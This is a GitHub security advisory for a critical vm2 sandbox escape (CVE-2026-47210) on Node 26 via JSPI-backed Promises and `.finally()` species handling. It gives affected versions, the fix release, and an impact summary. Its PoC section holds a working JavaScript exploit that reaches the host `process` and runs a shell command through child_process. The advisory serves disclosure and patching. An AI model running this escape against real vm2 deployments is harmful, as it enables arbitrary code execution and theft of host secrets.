# [C] vm2 sandbox escape via JSPI-backed Promise `.finally()` species bypass

## Summary
Severity: Critical
Advisory: GHSA-6j2x-vhqr-qr7q
CVE: CVE-2026-47210
CWE: CWE-913
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-05-29
Source: https://github.com/advisories/GHSA-6j2x-vhqr-qr7q
Type: github-advisory

## Affected
- npm: `vm2` — affected >=0 <3.11.4

## Details
### Summary
A sandbox escape vulnerability in `vm2` allows arbitrary code execution in the host process when untrusted code is executed with async support on runtimes exposing WebAssembly JSPI (`WebAssembly.promising` / `WebAssembly.Suspending`). In the tested configuration, a JSPI-backed Promise can reach `Promise.prototype.finally()` in a way that bypasses the expected Promise-species hardening and exposes a host-originated rejection object to attacker-controlled species logic, breaking the sandbox boundary.

This is a critical sandbox escape: any application that treats `vm2` as a security boundary may be fully compromised.

### Details

On node26, JSPI-backed Promises created through `WebAssembly.promising(...)` do not behave like ordinary sandbox Promises.

That path yields a host-originated `TypeError` during JSPI processing. Inside attacker-controlled species logic reached through `.finally()`, the rejection object exposes a usable host constructor chain. In the tested environment, the rejection object's constructor path can be used to reach host `process`, which leads to arbitrary code execution in the host process.

This behavior is specific to the JSPI / `.finally()` interaction. In contrast, the corresponding `then` / `catch` paths still appeared to route through `vm2`'s expected `localPromise` machinery in my testing.

### PoC
Environment: node:26-bookworm
```javascript
const {VM} = require("vm2");
const vm = new VM();
console.log(vm.run(`
(()=>{let b=Uint8Array.of(0,97,115,109,1,0,0,0,1,4,1,96,0,0,2,7,1,1,109,1,102,0,0,3,2,1,0,7,7,1,3,114,117,110,0,1,10,6,1,4,0,16,0,11);WebAssembly.instantiate(b,{m:{f:new WebAssembly.Suspending(()=>WebAssembly.compileStreaming(Promise.resolve(0)))}}).then(r=>{let p=WebAssembly.promising(r.instance.exports.run)();class F{constructor(x){this.s=0;this.q=[];x(v=>{this.s=1;this.v=v;for(let i of this.q)if(i[0])i[0](v)},e=>{
    let P=e.constructor.constructor('return process')()
    P.mainModule.require('child_process').execSync('touch pwned');
    this.s=2;this.v=e;for(let i of this.q)if(i[1])i[1](e)})}then(f,r){if(this.s==1)return f?f(this.v):this.v;if(this.s==2){if(r)return r(this.v);throw this.v}this.q.push([f,r]);return 0}}Object.defineProperty(F,Symbol.species,{get(){return F}});Object.defineProperty(p,'constructor',{get(){return F}});p.finally(()=>{})});return 1})()
`));
```

### Impact
This is a **sandbox escape leading to arbitrary code execution in the host process**.

Who is impacted:

- any application using `vm2` to execute attacker-controlled JavaScript as a security boundary
- especially Node.js runtimes exposing WebAssembly JSPI features (Node 26)

Practical impact:

- arbitrary command execution in the host process
- arbitrary file read / write accessible to the host process
- theft of secrets, tokens, credentials, and application data
- complete compromise of services relying on `vm2` isolation

## References
- https://github.com/patriksimek/vm2/security/advisories/GHSA-6j2x-vhqr-qr7q
- https://nvd.nist.gov/vuln/detail/CVE-2026-47210
- https://github.com/patriksimek/vm2/commit/6915fa4d9bcebd47b9a4f39a1adc1aa94ef6ffc6
- https://github.com/patriksimek/vm2
- https://github.com/patriksimek/vm2/releases/tag/v3.11.4
